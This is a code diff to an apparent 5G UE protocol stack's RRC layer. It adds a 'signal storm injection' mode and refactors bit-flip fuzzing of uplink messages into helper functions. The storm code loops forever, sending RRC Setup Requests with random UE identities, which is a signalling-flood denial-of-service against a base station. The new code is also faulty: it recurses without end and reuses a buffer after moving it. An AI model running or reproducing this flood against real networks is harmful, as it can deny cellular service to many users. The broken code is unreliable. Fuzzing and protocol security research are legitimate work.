@@ -660,7 +660,40 @@ void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
   uint32_t lcid = 0;
   log_rrc_message(get_rb_name(lcid), Tx, pdu.get(), msg, msg.msg.c1().type().to_string());
 
+  if (args.signal_storm_injection && (args.target_signal_attack == msg.msg.c1().type().to_string() || args.target_message == ""))
+    {
+      //for (int i = 0; i < 10; i++)
+      while (true)
+      {
+          std::cout << "Sending RRC Setup Request " << std::endl;
+          std::cout << "RRC_NR_STATE_CONNECTED: "<<state << std::endl;
+          logger.debug("Preparing RRC Setup Request");
 
+          // Prepare SetupRequest packet
+          ul_ccch_msg_s            ul_ccch_msg;
+          rrc_setup_request_ies_s* rrc_setup_req = &ul_ccch_msg.msg.set_c1().set_rrc_setup_request().rrc_setup_request;
+
+          // TODO: implement ng_minus5_g_s_tmsi_part1
+          rrc_setup_req->ue_id.set_random_value();
+          uint64_t random_id = srsran_random_uniform_int_dist(random_gen, 0, 12345);
+          for (uint i = 0; i < 5; i++) { // fill random ID bytewise, 40 bits = 5 bytes
+          random_id |= ((uint64_t)rand() & 0xFF) << i * 8;
+          }
+          rrc_setup_req->ue_id.random_value().from_number(random_id, rrc_setup_req->ue_id.random_value().length());
+
+          send_ul_ccch_msg(ul_ccch_msg);
+      }
+    }
+
+  rlc->write_sdu(lcid, std::move(pdu));
+
+
+  srsran::unique_byte_buffer_t fuzzed_pdu = fuzz_ccch_msg(std::move(pdu), msg);
+  
+  rlc->write_sdu(lcid, std::move(fuzzed_pdu));
+}
+
+srsran::unique_byte_buffer_t rrc_nr::fuzz_ccch_msg(srsran::unique_byte_buffer_t pdu, const asn1::rrc_nr::ul_ccch_msg_s msg){
   if (args.sdu_fuzzed_bits > 0 && (args.target_message == msg.msg.c1().type().to_string() || args.target_message == "")) {
     std::cout << "Fuzzing message: " << std::endl
                 << "\tMessage Type: " << msg.msg.c1().type().to_string() << std::endl
@@ -673,33 +706,9 @@ void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
           pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
     }
   }
- if (args.signal_storm_injection && (args.target_signal_attack == msg.msg.c1().type().to_string() || args.target_message == ""))
-  {
-    //for (int i = 0; i < 10; i++)
-    while (true)
-    {
-        std::cout << "Sending RRC Setup Request " << std::endl;
-        std::cout << "RRC_NR_STATE_CONNECTED: "<<state << std::endl;
-        logger.debug("Preparing RRC Setup Request");
-
-        // Prepare SetupRequest packet
-        ul_ccch_msg_s            ul_ccch_msg;
-        rrc_setup_request_ies_s* rrc_setup_req = &ul_ccch_msg.msg.set_c1().set_rrc_setup_request().rrc_setup_request;
-
-        // TODO: implement ng_minus5_g_s_tmsi_part1
-        rrc_setup_req->ue_id.set_random_value();
-        uint64_t random_id = srsran_random_uniform_int_dist(random_gen, 0, 12345);
-        for (uint i = 0; i < 5; i++) { // fill random ID bytewise, 40 bits = 5 bytes
-        random_id |= ((uint64_t)rand() & 0xFF) << i * 8;
-        }
-        rrc_setup_req->ue_id.random_value().from_number(random_id, rrc_setup_req->ue_id.random_value().length());
-
-        send_ul_ccch_msg(ul_ccch_msg);
-    }
-  }
-
-  rlc->write_sdu(lcid, std::move(pdu));
+   return std::move(pdu);
 }
+
 
 void rrc_nr::send_ul_dcch_msg(uint32_t lcid, const ul_dcch_msg_s& msg)
 {
@@ -720,6 +729,12 @@ void rrc_nr::send_ul_dcch_msg(uint32_t lcid, const ul_dcch_msg_s& msg)
     log_rrc_message(get_rb_name(lcid), Tx, pdu.get(), msg, msg.msg.c1().type().to_string());
   }
 
+  srsran::unique_byte_buffer_t fuzzed_pdu = fuzz_dcch_msg(std::move(pdu), msg);
+
+  pdcp->write_sdu(lcid, std::move(fuzzed_pdu));
+}
+
+srsran::unique_byte_buffer_t rrc_nr::fuzz_dcch_msg(srsran::unique_byte_buffer_t pdu, const asn1::rrc_nr::ul_dcch_msg_s msg){
   if (args.sdu_fuzzed_bits > 0 && (args.target_message == msg.msg.c1().type().to_string() || args.target_message == "")) {
     std::cout << "Fuzzing message: " << std::endl
                 << "\tMessage Type: " << msg.msg.c1().type().to_string() << std::endl
@@ -732,34 +747,7 @@ void rrc_nr::send_ul_dcch_msg(uint32_t lcid, const ul_dcch_msg_s& msg)
           pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
     }
   }
-
-  /*
-if (args.signal_storm_injection && (args.target_signal_attack == msg.msg.c1().type().to_string() || args.target_message == ""))
-  {
-    //for (int i = 0; i < 10000; i++)
-    //while (true)
-    {
-        std::cout << "Sending RRC Setup Request " << std::endl;
-        std::cout << "RRC_NR_STATE_CONNECTED: "<<state << std::endl;
-        logger.debug("Preparing RRC Setup Request");
-
-        // Prepare SetupRequest packet
-        ul_ccch_msg_s            ul_ccch_msg;
-        rrc_setup_request_ies_s* rrc_setup_req = &ul_ccch_msg.msg.set_c1().set_rrc_setup_request().rrc_setup_request;
-
-        // TODO: implement ng_minus5_g_s_tmsi_part1
-        rrc_setup_req->ue_id.set_random_value();
-        uint64_t random_id = srsran_random_uniform_int_dist(random_gen, 0, 12345);
-        for (uint i = 0; i < 5; i++) { // fill random ID bytewise, 40 bits = 5 bytes
-        random_id |= ((uint64_t)rand() & 0xFF) << i * 8;
-        }
-        rrc_setup_req->ue_id.random_value().from_number(random_id, rrc_setup_req->ue_id.random_value().length());
-
-        send_ul_ccch_msg(ul_ccch_msg);
-    }
-  }
-  */
-  pdcp->write_sdu(lcid, std::move(pdu));
+  return std::move(pdu);
 }
 
 void rrc_nr::send_con_setup_complete(srsran::unique_byte_buffer_t nas_msg)
